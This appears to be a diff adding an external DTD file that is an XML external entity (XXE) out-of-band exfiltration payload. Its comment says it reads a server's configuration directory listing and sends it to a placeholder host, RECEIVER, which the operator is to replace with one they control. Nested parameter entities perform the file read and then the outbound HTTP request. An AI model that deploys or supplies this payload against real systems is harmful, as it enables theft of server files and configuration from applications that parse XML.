@@ -1,0 +1,6 @@
+<!-- Reads a directory listing and sends it to RECEIVER as a URL query.
+     RECEIVER must be replaced with a host the operator controls. -->
+<!ENTITY % d SYSTEM "file:///opt/out/instance/server/default/conf/">
+<!ENTITY % w "<!ENTITY &#x25; f SYSTEM 'http://RECEIVER/X?d=%d;'>">
+%w;
+%f;
